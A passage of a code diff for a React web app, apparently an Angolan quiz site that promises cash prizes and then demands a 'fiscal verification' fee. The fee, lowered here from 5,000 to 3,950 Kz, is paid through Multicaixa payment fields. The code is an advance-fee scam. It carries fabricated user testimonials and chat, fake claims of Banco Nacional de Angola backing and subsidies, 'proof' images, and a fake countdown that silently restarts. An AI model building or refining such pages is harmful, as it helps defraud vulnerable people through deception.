@@ -1,6 +1,7 @@
 
 import React, { useState, useEffect } from 'react';
 import { Quiz } from './components/Quiz';
+import { GumletPlayer } from './components/GumletPlayer';
 import { GameState, UserStats, WithdrawMethod, Transaction } from './types';
 import heroImage from './src/assets/images/sou_angolano_hero_1779623430505.png';
 
@@ -32,7 +33,7 @@ const MOCK_CHAT_USERS = [
 ];
 
 const MOCK_SINGLE_COMMENTS = [
-  "Acabei de pagar os 5.000 Kz e os 150.000 Kz caíram directo na minha conta! Chocadooo!",
+  "Acabei de pagar os 3.950 Kz e os 150.000 Kz caíram directo na minha conta! Chocadooo!",
   "Muito bom o vídeo explicativo, agora percebi o processo de libertação no BNA.",
   "Isto é sério! Glória ao criador desta plataforma, cultura nacional valorizada!",
   "Estou a assistir e a ver o saldo a ser libertado! Brutal!",
@@ -48,7 +49,7 @@ const MOCK_SINGLE_COMMENTS = [
   "Minha conta do BAI recebeu em 2 minutos. Top!",
   "Já espalhei o link nos grupos da família, isto é ouro!",
   "O suporte deles é óptimo, mas nem precisei, o vídeo explica tudo de primeira.",
-  "Apenas 5.000 Kz de taxa para libertar 180.000 Kz? Muito justo!",
+  "Apenas 3.950 Kz de taxa para libertar 180.000 Kz? Muito justo!",
   "Fiz agora mesmo o pagamento e o saldo já mudou de reservado para disponível, rumo ao banco!",
   "Simplesmente perfeito! Angola unida no conhecimento e nos prémios!"
 ];
@@ -56,30 +57,30 @@ const MOCK_SINGLE_COMMENTS = [
 const MOCK_CHAT_THREADS = [
   {
     messages: [
-      { sender: "Sofia Benguela", text: "Quem conseguiu acertar tudo e fazer as 15 questões impecáveis?" },
+      { sender: "Sofia Benguela", text: "Quem conseguiu acertar tudo e fazer as 10 questões impecáveis?" },
       { sender: "Mauro Nzaji", text: "@Sofia Benguela Eu consegui acertar tudo! Mas tive de pensar bem na do rio Kwanza kkk." },
-      { sender: "Tuanaza Neto", text: "Eu só acertei 10, mas mesmo assim fiz 100.000 Kz! Já é um bom Kwanza!" }
+      { sender: "Tuanaza Neto", text: "Eu só acertei 8, mas mesmo assim fiz 120.000 Kz! Já é um bom Kwanza!" }
     ]
   },
   {
     messages: [
       { sender: "Gelson Lobito", text: "Aquela pergunta de história sobre a rainha Ginga foi um bocado difícil, vacilei e errei." },
-      { sender: "Kiesse Santos", text: "@Gelson Lobito A de história exige atenção, mas acertei 14! Quase perfeito." },
-      { sender: "Jandira Santos", text: "Acertei as 15 completas! O orgulho angolano e o estudo valeram a pena." }
+      { sender: "Kiesse Santos", text: "@Gelson Lobito A de história exige atenção, mas acertei 9! Quase perfeito." },
+      { sender: "Jandira Santos", text: "Acertei as 10 completas! O orgulho angolano e o estudo valeram a pena." }
     ]
   },
   {
     messages: [
-      { sender: "Simão Malanje", text: "Fiz apenas 11 acertos por causa da pressão do cronómetro kkkk 😭" },
-      { sender: "Nara de Sousa", text: "@Simão Malanje Pelo menos levaste 110.000 Kz! Vale muito a pena." },
+      { sender: "Simão Malanje", text: "Fiz apenas 8 acertos por causa da pressão do cronómetro kkkk 😭" },
+      { sender: "Nara de Sousa", text: "@Simão Malanje Pelo menos levaste 120.000 Kz! Vale muito a pena." },
       { sender: "Simão Malanje", text: "Simmm, já fiz a ativação e caiu em segundos!" }
     ]
   },
   {
     messages: [
       { sender: "Duarte Namibe", text: "Alguém errou a das Quedas de Kalandula? Estava na ponta da língua mas baralhei." },
-      { sender: "Adilson Capolo", text: "@Duarte Namibe Eu quase falhei essa! Mas consegui 15/15 no final." },
-      { sender: "Katia Huambo", text: "Eu fiz 12/15, falhei Kalandula também kkk. Mas o dinheiro já está na minha conta!" }
+      { sender: "Adilson Capolo", text: "@Duarte Namibe Eu quase falhei essa! Mas consegui 10/10 no final." },
+      { sender: "Katia Huambo", text: "Eu fiz 8/10, falhei Kalandula também kkk. Mas o dinheiro já está na minha conta!" }
     ]
   },
   {
@@ -177,6 +178,15 @@ const App: React.FC = () => {
   const [spectatorCount, setSpectatorCount] = useState(2415);
   const [chatMessages, setChatMessages] = useState<any[]>([]);
 
+  // Estados do Novo Checkout Personalizado (Controlo de tempo/urgência)
+  const [countdownSeconds, setCountdownSeconds] = useState(899); // 14 mins 59 secs
+
+  const formatTime = (totalSecs: number) => {
+    const mins = Math.floor(totalSecs / 60);
+    const secs = totalSecs % 60;
+    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+  };
+
   // Som de notificação de saque para causar impacto
   const playNotifSound = () => {
     try {
@@ -207,6 +217,21 @@ const App: React.FC = () => {
     }, 12000);
     return () => clearInterval(interval);
   }, []);
+
+  // Efeito do Temporizador do Checkout
+  useEffect(() => {
+    let timer: any = null;
+    if (gameState === GameState.CHECKOUT) {
+      timer = setInterval(() => {
+        setCountdownSeconds(prev => (prev > 0 ? prev - 1 : 899));
+      }, 1000);
+    } else {
+      setCountdownSeconds(899);
+    }
+    return () => {
+      if (timer) clearInterval(timer);
+    };
+  }, [gameState]);
 
   // Rolagem automática para o topo ao trocar de tela / gameState
   useEffect(() => {
@@ -300,7 +325,7 @@ const App: React.FC = () => {
     setStats({ 
       score, 
       correctAnswers: correctCount, 
-      totalQuestions: 15, 
+      totalQuestions: 10, 
       accumulatedKz: kz, 
       bestScoreKz: Math.max(stats.bestScoreKz, kz) 
     });
@@ -666,22 +691,7 @@ const App: React.FC = () => {
           </div>
           
           <div className="aspect-video w-full rounded-2xl md:rounded-[2rem] overflow-hidden bg-black border border-zinc-800 relative group-hover:scale-[1.01] transition-transform duration-500">
-            <img 
-              src={heroImage} 
-              alt="Sou Angolano - Hero" 
-              className="w-full h-full object-cover select-none" 
-              referrerPolicy="no-referrer"
-            />
-            {/* Elegant overlay gradient to show exciting gameplay depth */}
-            <div className="absolute inset-0 bg-gradient-to-t from-black/85 via-black/20 to-transparent"></div>
-            <div className="absolute bottom-4 left-4 md:bottom-6 md:left-6 text-left">
-              <span className="bg-angola-red/90 text-white font-black uppercase text-[8px] sm:text-[10px] px-2.5 py-1 rounded tracking-[0.15em] shadow-lg mb-2 inline-block animate-bounce">
-                EMPOLGANTE & REAL 💰
-              </span>
-              <h3 className="text-white text-lg sm:text-2xl md:text-3xl font-black italic tracking-tight uppercase leading-none drop-shadow-lg">
-                O Teu Conhecimento Vale Ouro!
-              </h3>
-            </div>
+            <GumletPlayer />
           </div>
           
           <div className="mt-3 px-1 flex flex-col sm:flex-row justify-between items-center text-[8px] md:text-[10px] font-black text-zinc-400 uppercase tracking-widest gap-1 sm:gap-0">
@@ -781,7 +791,7 @@ const App: React.FC = () => {
                  </div>
                  <div className="flex items-center gap-6 group">
                     <span className="bg-angola-yellow text-black w-12 h-12 rounded-2xl flex items-center justify-center shrink-0 font-black text-xl group-hover:rotate-12 transition-transform shadow-lg">3</span>
-                    <p className="font-bold text-sm sm:text-base md:text-lg">O levantamento é imediato após a <span className="text-angola-red font-black">Verificação Fiscal (5.000 Kz)</span> para isenção de impostos.</p>
+                    <p className="font-bold text-sm sm:text-base md:text-lg">O levantamento é imediato após a <span className="text-angola-red font-black">Verificação Fiscal (3.950 Kz)</span> para isenção de impostos.</p>
                  </div>
                </div>
                <button onClick={() => setGameState(GameState.HOME)} className="w-full py-5 bg-zinc-800 text-white font-black rounded-xl sm:rounded-[2rem] hover:bg-zinc-700 transition-all uppercase tracking-widest text-xs sm:text-sm border-b-4 border-zinc-950">ENTENDI, QUERO JOGAR</button>
@@ -956,7 +966,7 @@ const App: React.FC = () => {
                     </div>
                     <div className="bg-zinc-900/50 p-4 rounded-2xl border border-zinc-900">
                       <p className="text-[9px] text-zinc-500 uppercase font-black tracking-wider mb-1">CULTURA GERAL DE ANGOLA</p>
-                      <p className="font-black text-white text-sm">PROVA DE {stats.correctAnswers} / 15 ACERTOS ✅</p>
+                      <p className="font-black text-white text-sm">PROVA DE {stats.correctAnswers} / 10 ACERTOS ✅</p>
                     </div>
                     <div className="bg-zinc-900/50 p-4 rounded-2xl border border-zinc-900">
                       <p className="text-[9px] text-zinc-500 uppercase font-black tracking-wider mb-1">STATUS ADMINISTRATIVO</p>
@@ -978,16 +988,10 @@ const App: React.FC = () => {
                 </div>
 
                 {/* Big Excitement Actions */}
-                <div className="flex flex-col md:flex-row gap-6">
-                  <button 
-                    onClick={() => { playVictoryCascadeSound(); setGameState(GameState.QUIZ); }} 
-                    className="flex-1 py-5 md:py-7 bg-zinc-950 hover:bg-zinc-900 text-zinc-400 font-black rounded-2xl md:rounded-[2.5rem] uppercase text-xs sm:text-sm border-2 border-zinc-800 hover:border-zinc-700 transition-all select-none cursor-pointer"
-                  >
-                    🔄 TURBINAR MAIS OS MEUS GANHOS
-                  </button>
+                <div className="flex justify-center pt-2">
                   <button 
                     onClick={() => setGameState(GameState.WITHDRAW_METHOD)} 
-                    className="flex-1 py-5 md:py-7 btn-ganho text-black font-black rounded-2xl md:rounded-[2.5rem] text-sm sm:text-lg md:text-xl shadow-[0_12px_40px_rgba(248,211,8,0.55)] hover:scale-105 active:scale-95 uppercase italic animate-pulse cursor-pointer relative overflow-hidden group select-none"
+                    className="w-full py-5 md:py-7 btn-ganho text-black font-black rounded-2xl md:rounded-[2.5rem] text-sm sm:text-lg md:text-xl shadow-[0_12px_40px_rgba(248,211,8,0.55)] hover:scale-105 active:scale-95 uppercase italic animate-pulse cursor-pointer relative overflow-hidden group select-none"
                   >
                     <span className="relative z-10 flex items-center justify-center gap-2">
                       <span>SACAR TODO O MEU SALDO CASHOUT</span>
@@ -1044,7 +1048,7 @@ const App: React.FC = () => {
                     <div className="w-16 h-16 sm:w-20 sm:h-20 bg-zinc-950 rounded-xl border border-zinc-800 flex flex-col justify-center items-center relative overflow-hidden shadow-inner font-black text-center">
                       <span className="text-3xl filter hover:scale-110 duration-200 transition-transform select-none">🏆</span>
                       <div className="absolute bottom-0 left-0 w-full bg-angola-yellow text-[7px] text-black font-black py-0.5 tracking-wider uppercase">
-                        {stats.correctAnswers}/15 ACERTOS
+                        {stats.correctAnswers}/10 ACERTOS
                       </div>
                     </div>
                     {/* Glowing pulse indicator */}
@@ -1300,7 +1304,7 @@ const App: React.FC = () => {
 
                   <div className="flex justify-between border-t border-zinc-300 pt-3 text-amber-700 font-black text-[11px] leading-tight">
                     <span>TAXA DE VERIFICAÇÃO DE DADOS (AGT/BNA):</span> 
-                    <span className="text-right">5.000 Kz</span>
+                    <span className="text-right">3.950 Kz</span>
                   </div>
                 </div>
 
@@ -1397,15 +1401,15 @@ const App: React.FC = () => {
                     </div>
 
                     {/* Highly Compelling Video Frame Area */}
-                    <div className="aspect-[9/16] w-full max-w-[350px] mx-auto rounded-2xl overflow-hidden bg-zinc-950 border border-zinc-900 relative">
+                    <div className="aspect-[30/47] w-full max-w-[350px] mx-auto rounded-2xl overflow-hidden bg-zinc-950 border border-zinc-900 relative">
                       <iframe 
-                        id="ifr_6a10e2ddd3c9558880ea8313" 
-                        title="Vídeo de desbloqueio" 
-                        src="https://scripts.converteai.net/c225a123-d2c0-49df-be35-4415d67db0bc/players/6a10e2ddd3c9558880ea8313/v4/embed.html?&amp;vl=https%3A%2F%2Fkizubamind.vercel.app%2Fativacao" 
+                        id="ifr_gumlet_mandatory" 
+                        title="Gumlet video player" 
+                        src="https://play.gumlet.io/embed/6a2602bffc14746995ba3c1d?background=false&amp;autoplay=false&amp;loop=false&amp;disable_player_controls=false" 
                         className="absolute left-0 top-0 h-full w-full border-0" 
-                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+                        allow="accelerometer; gyroscope; autoplay; encrypted-media; picture-in-picture; fullscreen; clipboard-write;" 
                         allowFullScreen={true} 
-                        loading="eager" 
+                        loading="lazy" 
                         referrerPolicy="origin"
                       ></iframe>
                       
@@ -1483,7 +1487,7 @@ const App: React.FC = () => {
                     </button>
                     
                     <p className="text-zinc-400 font-extrabold uppercase text-xs tracking-widest">
-                      Valor Único Processual: <span className="text-angola-yellow text-[13px] font-black">5.000 Kz (Isenção Fiscal AGT/BNA)</span>
+                      Valor Único Processual: <span className="text-angola-yellow text-[13px] font-black">3.950 Kz (Isenção Fiscal AGT/BNA)</span>
                     </p>
                   </div>
 
@@ -1533,76 +1537,76 @@ const App: React.FC = () => {
 
               <div className="relative z-10 space-y-8">
                 {/* Core Header badge of celebration */}
-                <div className="flex flex-col items-center gap-3">
+                <div className="flex flex-col items-center gap-4">
                   <div className="inline-flex items-center gap-2 bg-gradient-to-r from-red-600/20 via-yellow-500/20 to-green-600/20 border border-yellow-500/30 px-6 py-2 rounded-full font-black text-xs sm:text-sm tracking-[0.2em] uppercase text-angola-yellow animate-pulse shadow-md">
-                    🌍 DIA DE ÁFRICA • SUBVENÇÃO ESPECIAL
+                    🏆 VENCEDOR SOU ANGOLANO 🏆
                   </div>
                   <h2 className="text-3xl sm:text-5xl md:text-6xl font-black italic uppercase tracking-tighter text-glow-yellow text-white leading-none">
-                    PARABÉNS ÁFRICA!
+                    Parabéns, {userName ? userName.toUpperCase() : 'PARTICIPANTE'}!
                   </h2>
-                  <p className="text-xs sm:text-sm font-black tracking-widest text-zinc-400 uppercase">
-                    Comemoração do Aniversário de Fundação de Nossa Amada África 🇦🇴🌍
+                  <p className="text-lg sm:text-2xl font-black max-w-2xl mx-auto leading-tight text-white uppercase italic tracking-tight">
+                    Você é o nosso mais novo vencedor.
+                  </p>
+                  <p className="text-xs sm:text-sm font-bold text-zinc-400 max-w-lg mx-auto">
+                    O seu conhecimento de cultura geral garantiu a sua qualificação e o saque total da sua recompensa nacional.
                   </p>
                 </div>
 
-                {/* Highly Appealing Story details of BNA Sponsorship */}
-                <div className="bg-gradient-to-b from-zinc-900/80 to-zinc-950 p-5 sm:p-8 border-2 border-zinc-800 rounded-3xl sm:rounded-[2.5rem] text-zinc-300 font-bold max-w-2xl mx-auto space-y-4 text-center sm:text-left">
-                  <p className="text-sm sm:text-base leading-relaxed">
-                    Em honra à união, cultura e história do nosso belo continente nestas celebrações do <span className="text-angola-yellow font-black animate-pulse">Dia de África (25 de Maio)</span>, o <span className="text-white font-black underline decoration-angola-yellow">Banco Nacional de Angola (BNA)</span> autorizou uma subvenção cultural inédita e extraordinária!
-                  </p>
-                  <p className="text-xs sm:text-sm text-zinc-400 italic text-center">
-                    O BNA assumiu directamente parte dos encargos operacionais de transferência rápida do Concurso "Sou Angolano" para todos os cidadãos qualificados. Como resultado direto do patrocínio BNA, a taxa processual anti-fraude obrigatória desceu expressivamente!
+                {/* Subtitle / Certificate layout */}
+                <div className="bg-gradient-to-b from-zinc-900/80 to-zinc-950 p-5 sm:p-7 border-2 border-zinc-900 rounded-3xl text-zinc-300 font-bold max-w-2xl mx-auto space-y-3 text-center sm:text-left">
+                  <p className="text-xs sm:text-sm text-zinc-400 italic text-center leading-relaxed">
+                    Todos os sistemas antifraude do Banco Nacional de Angola validaram a segurança do seu balanço acumulado de <span className="text-green-400 font-black">{(stats.accumulatedKz || 150000).toLocaleString('pt-AO')} Kz</span>. Efetue abaixo o saque imediato.
                   </p>
                 </div>
 
-                {/* Irresistible Price Transformation Component */}
-                <div className="max-w-md mx-auto bg-black border-4 border-dashed border-zinc-800 p-6 sm:p-8 rounded-[2rem] sm:rounded-[3rem] shadow-[inset_0_0_30px_rgba(248,211,8,0.1)] relative overflow-hidden group hover:border-angola-yellow transition-colors duration-300">
-                  <div className="absolute top-2 right-4 text-[8px] sm:text-[10px] font-mono text-zinc-500 tracking-widest uppercase">BILHETE DE DESCONTO BNA</div>
-                  
-                  <div className="grid grid-cols-2 gap-4 items-center relative z-10 pt-4 pb-2">
-                    {/* Before Option */}
-                    <div className="text-center border-r border-zinc-900 pr-2">
-                      <p className="text-zinc-500 text-[10px] sm:text-xs font-black uppercase tracking-wider">TAXA INTEGRAL</p>
-                      <p className="text-2xl sm:text-3xl font-black text-rose-500 line-through tracking-tight mt-1 opacity-70">
-                        6.000 Kz
-                      </p>
-                      <span className="text-[8px] text-zinc-650 font-bold uppercase mt-1 block">Sem Subvenção</span>
+                {/* Vertical Testimonial Images Stack (Fully Visible, High Resolution Stack) */}
+                <div className="space-y-6 pt-4 max-w-xl mx-auto">
+                  <p className="text-[10px] font-black tracking-widest uppercase text-zinc-500 text-center">
+                    📸 COMPROVATIVOS DE RECEBIMENTO DO PRÉMIO
+                  </p>
+                  <div className="flex flex-col gap-6">
+                    
+                    {/* Image Space 1 */}
+                    <div className="w-full bg-zinc-950 rounded-2xl md:rounded-3xl border-4 border-zinc-900 overflow-hidden shadow-2xl transition-all duration-300 hover:border-yellow-500/40">
+                      <img 
+                        src="https://i.postimg.cc/6qm0R0bX/testimonial-1-Df-EKVQq8.jpg" 
+                        alt="Prova do Vencedor 1" 
+                        className="w-full h-auto object-contain block opacity-100" 
+                        referrerPolicy="no-referrer" 
+                      />
                     </div>
 
-                    {/* After Option */}
-                    <div className="text-center pl-2">
-                      <p className="text-angola-yellow text-[10px] sm:text-xs font-black uppercase tracking-wider flex items-center justify-center gap-1">
-                        ✨ COM BÓNUS BNA
-                      </p>
-                      <p className="text-3xl sm:text-4xl md:text-5xl font-black text-green-400 tracking-tight mt-1 animate-pulse drop-shadow-[0_4px_12px_rgba(74,222,128,0.3)]">
-                        5.000 Kz
-                      </p>
-                      <span className="text-[8px] bg-green-500/15 text-green-400 font-extrabold px-1.5 py-0.5 rounded uppercase mt-1 inline-block border border-green-500/25">
-                        Poupa 1.000 Kz
-                      </span>
+                    {/* Image Space 2 */}
+                    <div className="w-full bg-zinc-950 rounded-2xl md:rounded-3xl border-4 border-zinc-900 overflow-hidden shadow-2xl transition-all duration-300 hover:border-yellow-500/40">
+                      <img 
+                        src="https://i.postimg.cc/sDwXP2z2/testimonial-2-BYoy9WD7.jpg" 
+                        alt="Prova do Vencedor 2" 
+                        className="w-full h-auto object-contain block opacity-100" 
+                        referrerPolicy="no-referrer" 
+                      />
                     </div>
-                  </div>
 
-                  {/* Certified reciepient banner */}
-                  <div className="mt-4 pt-4 border-t border-zinc-900 flex flex-col items-center gap-1 text-[9px] sm:text-[11px] font-black text-zinc-400 uppercase tracking-widest">
-                    <span>📃 Beneficiário Autorizado:</span>
-                    <span className="text-emerald-500 font-black tracking-normal text-xs sm:text-sm flex items-center gap-1.5">
-                      👤 {userName ? userName.toUpperCase() : 'JOGADOR SOU ANGOLANO'}
-                    </span>
-                  </div>
-                </div>
+                    {/* Image Space 3 */}
+                    <div className="w-full bg-zinc-950 rounded-2xl md:rounded-3xl border-4 border-zinc-900 overflow-hidden shadow-2xl transition-all duration-300 hover:border-yellow-500/40">
+                      <img 
+                        src="https://i.postimg.cc/HL5dNYq8/testimonial-3-B9Ttco-A.jpg" 
+                        alt="Prova do Vencedor 3" 
+                        className="w-full h-auto object-contain block opacity-100" 
+                        referrerPolicy="no-referrer" 
+                      />
+                    </div>
 
-                {/* 5-Day Expiration Countdown Notice banner */}
-                <div className="max-w-md mx-auto py-3.5 px-4 bg-gradient-to-r from-red-600/30 via-yellow-500/10 to-red-600/30 border-2 border-red-500/40 shadow-[0_0_20px_rgba(239,68,68,0.15)] rounded-2xl animate-pulse text-center">
-                  <div className="flex flex-wrap items-center justify-center gap-2 text-[10px] sm:text-xs font-black uppercase text-white tracking-widest">
-                    <span>⏰ ATENÇÃO: ESTE DESCONTO COMEMORATIVO EXPIRA EM:</span> 
-                    <span className="bg-gradient-to-r from-red-600 to-rose-600 text-white px-2.5 py-0.5 rounded font-mono text-xs shadow-md border border-red-500 inline-block animate-bounce">
-                      5 DIAS
-                    </span>
+                    {/* Image Space 4 */}
+                    <div className="w-full bg-zinc-950 rounded-2xl md:rounded-3xl border-4 border-zinc-900 overflow-hidden shadow-2xl transition-all duration-300 hover:border-yellow-500/40">
+                      <img 
+                        src="https://i.postimg.cc/6pvkWHYd/testimonial-4-Cf-FOMj-L.jpg" 
+                        alt="Prova do Vencedor 4" 
+                        className="w-full h-auto object-contain block opacity-100" 
+                        referrerPolicy="no-referrer" 
+                      />
+                    </div>
+
                   </div>
-                  <p className="text-[8px] sm:text-[9px] font-bold uppercase text-zinc-400 mt-1.5 tracking-wider">
-                    Após este período comemorativo, a taxa protocolar do BNA retornará automaticamente ao valor padrão de 6.000 Kz.
-                  </p>
                 </div>
 
                 {/* Subvention Trust badge details */}
@@ -1627,7 +1631,7 @@ const App: React.FC = () => {
                     }}
                     className="w-full py-5 sm:py-8 bg-gradient-to-r from-emerald-500 via-green-600 to-emerald-500 hover:from-green-500 hover:to-green-600 text-white font-black rounded-2xl sm:rounded-[3rem] text-lg sm:text-2xl uppercase tracking-wider shadow-[0_15px_45px_rgba(16,185,129,0.4)] hover:scale-103 active:scale-95 duration-100 transition-all select-none cursor-pointer border-b-8 border-green-800 active:border-b-2 flex items-center justify-center gap-2.5"
                   >
-                    <span>REIVINDICAR BÓNUS BNA DE 5.000 Kz 👑</span>
+                    <span>CONCLUIR E SACAR MEU PRÉMIO DE {(stats.accumulatedKz || 150000).toLocaleString('pt-AO')} Kz 🏧</span>
                     <span className="text-3xl animate-bounce">🌍</span>
                   </button>
 
@@ -1657,7 +1661,7 @@ const App: React.FC = () => {
             <div className="absolute top-10 left-10 w-[250px] h-[250px] bg-amber-600 rounded-full opacity-10 blur-[130px] pointer-events-none"></div>
             <div className="absolute bottom-10 right-10 w-[250px] h-[250px] bg-red-650 rounded-full opacity-10 blur-[130px] pointer-events-none"></div>
 
-            <div className="bg-zinc-950/95 backdrop-blur-3xl p-6 sm:p-10 rounded-[2.5rem] sm:rounded-[3.5rem] border-4 border-amber-500 shadow-[0_0_60px_rgba(245,158,11,0.25)] relative overflow-hidden">
+            <div className="bg-zinc-950/95 backdrop-blur-3xl p-5 sm:p-8 rounded-[2.5rem] sm:rounded-[3.5rem] border-4 border-amber-500 shadow-[0_0_60px_rgba(245,158,11,0.25)] relative overflow-hidden">
               
               {/* Dynamic top bar signature with Angola Flag gradient style */}
               <div className="absolute top-0 left-0 w-full h-3 bg-gradient-to-r from-red-600 via-zinc-900 to-amber-500"></div>
@@ -1680,99 +1684,383 @@ const App: React.FC = () => {
                 {/* Header Badge */}
                 <div className="text-center space-y-3">
                   <div className="inline-flex items-center gap-2 bg-amber-500/10 border border-amber-500/30 px-5 py-2 rounded-full font-black text-[10px] sm:text-xs tracking-[0.2em] uppercase text-amber-400 shadow-[inset_0_0_15px_rgba(245,158,11,0.05)]">
-                    🔒 SISTEMA SEGURO DE ATIVAÇÃO DE TRANSFERÊNCIAS (EMIS/BNA)
+                    🔒 CHECKOUT SEGURO • CANAL MULTICAIXA BNA
                   </div>
-                  <h2 className="text-3xl sm:text-5xl font-black italic uppercase tracking-tighter text-white">
-                    GUIA DE VALIDAÇÃO DE PRÉMIO 👑
+                  <h2 className="text-2xl sm:text-4xl font-black italic uppercase tracking-tighter text-white">
+                    VALIDAÇÃO DE IDENTIDADE E SAQUE 🏦
                   </h2>
-                  
-                  {/* Irresistible Value Prop & Reembolso Guarantee banner */}
-                  <div className="bg-gradient-to-br from-zinc-900 via-zinc-950 to-zinc-900 border-2 border-zinc-850 rounded-2xl p-4 sm:p-5 text-left space-y-3 shadow-inner relative overflow-hidden">
-                    <div className="absolute top-0 right-0 w-32 h-32 bg-amber-500/5 rounded-full blur-2xl pointer-events-none"></div>
-                    <div className="flex items-center gap-2.5 text-amber-400 font-black text-xs sm:text-sm uppercase tracking-wider pb-2 border-b border-zinc-900">
-                      <span>🏦 GARANTIA DE REEMBOLSO INTEGRAL DA TAXA PROTOCOLAR</span>
-                    </div>
-                    <p className="text-xs text-zinc-300 font-bold leading-relaxed text-slate-300">
-                      Para provar que a sua atividade na plataforma é legítima e que você não é um robô de spam automatizado, o Banco Nacional de Angola e a EMIS exigem o pagamento protocolar da taxa de ativação anti-fraude no valor único de <strong className="text-amber-400 underline">5.000,00 Kz</strong>.
-                    </p>
-                    <div className="bg-amber-550/15 border border-amber-500/30 rounded-xl p-3 text-[11px] sm:text-xs text-yellow-300 font-black flex items-start gap-2 uppercase">
-                      <span>💎</span>
-                      <span>INFORMAÇÃO IMPORTANTE: O valor de 5.000,00 Kz será somado e INTEGRALMENTE DEVOLVIDO na sua conta de destino na mesma transferência do saque total! O seu saque libertado será de {((stats.accumulatedKz || 165000) + 5000).toLocaleString('pt-AO')} Kz.</span>
-                    </div>
-                  </div>
+                  <p className="text-xs sm:text-sm text-zinc-400 font-bold max-w-xl mx-auto">
+                    Olá, <span className="text-amber-400">{userName ? userName.toUpperCase() : 'VENCEDOR'}</span>! O seu processo de transferência está no último passo. Conclua a ativação eletrónica contra robôs abaixo.
+                  </p>
                 </div>
 
-                {/* Direct Online Payment Button - Irresistible & Premium */}
-                <div className="bg-gradient-to-r from-amber-500/20 via-yellow-500/10 to-amber-500/20 border-2 border-amber-500 rounded-3xl p-6 text-center space-y-4 shadow-[0_0_30px_rgba(245,158,11,0.25)]">
-                  <div className="flex flex-col lg:flex-row items-center justify-between gap-5 text-left">
-                    <div className="space-y-1.5 max-w-xl">
-                      <div className="inline-flex items-center gap-1.5 bg-amber-500/20 text-amber-400 border border-amber-500/30 font-black text-[10px] px-2.5 py-1 rounded-md uppercase tracking-wider">
-                        ⚡ COMPENSAÇÃO IMEDIATA (30 SEGUNDOS)
+                {uploadStatus === 'idle' ? (
+                  <>
+                    {/* Urgency countdown indicator */}
+                    <div className="bg-red-950/40 border border-red-500/30 rounded-2xl p-4 flex flex-col sm:flex-row items-center justify-between gap-3 text-center sm:text-left">
+                      <div className="flex items-center gap-3">
+                        <span className="text-2xl animate-pulse">⏳</span>
+                        <div>
+                          <p className="text-xs font-black uppercase text-red-400 tracking-wider">A REFERÊNCIA IRÁ EXPIRAR EM BREVE</p>
+                          <p className="text-[10px] text-zinc-400 font-bold">Faça o pagamento antes que os fundos retornem ao Tesouro Nacional.</p>
+                        </div>
                       </div>
-                      <h4 className="text-lg sm:text-2xl font-black text-white italic uppercase tracking-tight">
-                        MÉTODO 1: ATIVAÇÃO ONLINE AUTOMÁTICA (RECOMENDADO)
+                      <div className="bg-black/60 border border-red-500/40 px-5 py-2 rounded-xl font-mono text-xl sm:text-2xl font-black text-red-500 tracking-wider">
+                        {formatTime(countdownSeconds)}
+                      </div>
+                    </div>
+
+                    {/* Rich Multicaixa Display Panel */}
+                    <div className="bg-gradient-to-b from-zinc-900 to-zinc-950 border border-zinc-850 rounded-3xl p-5 sm:p-6 space-y-5 shadow-2x">
+                      <div className="flex items-center justify-between pb-3 border-b border-zinc-850">
+                        <div className="flex items-center gap-2">
+                          <div className="w-3.5 h-3.5 rounded-full bg-blue-500 shadow-[0_0_8px_rgba(59,130,246,0.5)]"></div>
+                          <span className="text-[11px] font-black uppercase text-zinc-300 tracking-widest">MULTICAIXA — PAGAMENTO DE SERVIÇOS</span>
+                        </div>
+                      </div>
+
+                      {/* BNA 21% Subsidy Celebration & Explanation Banner */}
+                      <div className="bg-amber-500/10 border-2 border-amber-500/30 rounded-2xl p-4 flex flex-col md:flex-row items-center gap-4 text-left">
+                        <div className="text-3xl shrink-0 animate-bounce">🎉</div>
+                        <div className="space-y-1">
+                          <h4 className="text-[11px] font-black text-amber-400 uppercase tracking-widest flex items-center gap-1.5">
+                            CAMPANHA NACIONAL DE INCLUSÃO FINANCEIRA (EMIS & BNA)
+                          </h4>
+                          <p className="text-[11px] text-zinc-300 font-bold leading-relaxed">
+                            <strong className="text-white">Aviso de Tarifa Reduzida:</strong> No vídeo explicativo padrão é mencionado o valor de <span className="line-through text-rose-450 font-black">5.000,00 Kz</span>. No entanto, por motivo de celebração do <strong className="text-white">Protocolo de Apoio ao Cidadão do Banco Nacional de Angola (BNA)</strong>, o Estado Angolano está a subsidiar <strong className="text-emerald-450">1.050,00 Kz (21% dos encargos)</strong> para encorajar as transações eletrónicas nacionais! Com isso, o valor real a transferir foi reduzido temporariamente para apenas <strong className="text-amber-400 font-black">3.950,00 Kz</strong> (e receberá de volta a totalidade no saque final).
+                          </p>
+                        </div>
+                      </div>
+
+                      {/* Payment Fields (Entidade, Referência, Montante) */}
+                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                        
+                        {/* Entidade Field */}
+                        <div className="bg-black/40 border border-zinc-900 rounded-2xl p-4 text-center relative group hover:border-amber-500/25 transition-all">
+                          <span className="text-[9px] font-black tracking-widest text-zinc-500 uppercase block mb-1.5">ENTIDADE</span>
+                          <span className="text-2xl font-mono font-black text-white block tracking-widest">
+                            {paymentEntity}
+                          </span>
+                          <button
+                            onClick={() => {
+                              navigator.clipboard.writeText(paymentEntity.replace(/\s+/g, ''));
+                              try {
+                                const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
+                                const ctx = new AudioCtx();
+                                const osc = ctx.createOscillator();
+                                const gain = ctx.createGain();
+                                osc.connect(gain); gain.connect(ctx.destination);
+                                osc.frequency.setValueAtTime(800, ctx.currentTime);
+                                gain.gain.setValueAtTime(0.05, ctx.currentTime);
+                                osc.start(); osc.stop(ctx.currentTime + 0.05);
+                              } catch (e) {}
+                              setCopiedField('entity');
+                              setTimeout(() => setCopiedField(null), 2000);
+                            }}
+                            className="mt-3.5 w-full py-2 bg-zinc-900 hover:bg-zinc-850 text-[10px] font-black text-amber-400 rounded-xl uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer hover:scale-[1.02] border border-zinc-805"
+                          >
+                            <span>{copiedField === 'entity' ? '✅ COPIADO!' : '📋 COPIAR'}</span>
+                          </button>
+                        </div>
+
+                        {/* Referência Field */}
+                        <div className="bg-black/40 border border-zinc-900 rounded-2xl p-4 text-center relative group hover:border-amber-500/25 transition-all">
+                          <span className="text-[9px] font-black tracking-widest text-zinc-500 uppercase block mb-1.5">REFERÊNCIA</span>
